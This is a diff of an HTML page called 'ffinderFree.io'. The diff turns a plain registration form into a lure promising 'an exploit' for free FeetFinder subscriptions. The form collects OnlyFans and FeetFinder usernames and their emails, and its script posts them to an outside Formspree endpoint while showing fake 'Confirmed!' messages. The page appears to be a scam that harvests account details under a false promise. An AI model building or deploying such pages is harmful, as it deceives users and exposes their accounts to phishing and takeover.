@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>ffinderFree.io • Contacto</title>
+<title>FeetFinder free tool</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 <style>
 :root {
@@ -82,39 +82,35 @@ textarea{min-height:120px}
       </div>
       <div class="siteinfo">
         <div class="title">ffinderFree.io</div>
-        <div class="sub">seguridad • registros confiables</div>
       </div>
     </div>
     <div style="text-align:right">
       <div style="font-family:'Roboto Mono',monospace;font-weight:700">C0NJUR3R-droid</div>
-      <div style="color:var(--muted);font-size:.9rem">hacker friendly • confianza</div>
     </div>
   </header>
 
   <section class="hero">
-    <h2>Registro de cuentas</h2>
-    <p>Ingresa usuarios y correos de los dos servicios que quieras registrar.</p>
+    <h2>Introduction</h2>
+    <p>This tool is focused helped by an exploit for try to obtain any of the three subscription options on the FeetFinder Platform, this is no guaranteed solution, and after 1 week we suggest to try again</p>
   </section>
 
   <aside class="panel">
-    <h2>Enviar datos</h2>
+    <h2>Please fill all fields</h2>
     <form id="f" action="https://formspree.io/f/xvgwrkvv" method="POST">
-      <label for="usuarioA">Usuario (Servicio A)</label>
+      <label for="usuarioA">OnlyFans Username (not need to be a active account, you can create a brand new)</label>
       <input id="usuarioA" name="usuarioA" required>
-      <label for="correoA">Correo de registro (Servicio A)</label>
+      <label for="correoA">Valid email used on Onlyfans</label>
       <input id="correoA" name="correoA" type="email" required>
-      <label for="usuarioB">Usuario (Servicio B)</label>
+      <label for="usuarioB">FeetFinder Username</label>
       <input id="usuarioB" name="usuarioB" required>
-      <label for="correoB">Correo de registro (Servicio B)</label>
+      <label for="correoB">Valid email used on FeetFinder</label>
       <input id="correoB" name="correoB" type="email" required>
-      <label for="nota">Nota adicional</label>
-      <textarea id="nota" name="nota"></textarea>
-      <button id="btn" class="btn" type="submit">Enviar</button>
+      <button id="btn" class="btn" type="submit">Submit</button>
       <div class="status" id="status"></div>
     </form>
   </aside>
 
-  <div class="footer">© ffinderFree.io • diseño C0NJUR3R-droid</div>
+  <div class="footer">© ffinderFree.io • design C0NJUR3R-droid</div>
 </div>
 
 <div id="overlay" class="overlay">
@@ -123,9 +119,9 @@ textarea{min-height:120px}
       <circle cx="60" cy="60" r="56" class="checkcircle"/>
       <path d="M36 62 L52 78 L84 44" class="checkpath"/>
     </svg>
-    <div class="loadermsg" id="loadermsg">Procesando…</div>
-    <div class="submsg" id="submsg">Tu envío está en curso</div>
-    <button id="closeOverlay" class="closebtn" style="display:none">Cerrar</button>
+    <div class="loadermsg" id="loadermsg">Calculating…</div>
+    <div class="submsg" id="submsg">We are processing your request</div>
+    <button id="closeOverlay" class="closebtn" style="display:none">Close</button>
   </div>
 </div>
 
@@ -141,24 +137,24 @@ const closeBtn=document.getElementById('closeOverlay')
 f.addEventListener('submit',async e=>{
   e.preventDefault()
   overlay.classList.add('show')
-  loadermsg.textContent='Enviando…'
-  submsg.textContent='Por favor espera un momento'
+  loadermsg.textContent='Sending request…'
+  submsg.textContent='Please wait'
   closeBtn.style.display='none'
   try{
     const res=await fetch(f.action,{method:'POST',headers:{'Accept':'application/json'},body:new FormData(f)})
     if(res.ok){
       f.reset()
-      loadermsg.textContent='¡Envío confirmado!'
-      submsg.textContent='Hemos recibido tu información de manera segura'
+      loadermsg.textContent='Confirmed!'
+      submsg.textContent='Sended Request!'
       closeBtn.style.display='inline-block'
     }else{
-      loadermsg.textContent='Error en el envío'
-      submsg.textContent='Intenta nuevamente más tarde'
+      loadermsg.textContent='Send Error'
+      submsg.textContent='Try again on several minutes'
       closeBtn.style.display='inline-block'
     }
   }catch(err){
-    loadermsg.textContent='Error de red'
-    submsg.textContent='Revisa tu conexión e inténtalo de nuevo'
+    loadermsg.textContent='Network error'
+    submsg.textContent='Check you connection and try again'
     closeBtn.style.display='inline-block'
   }
 })
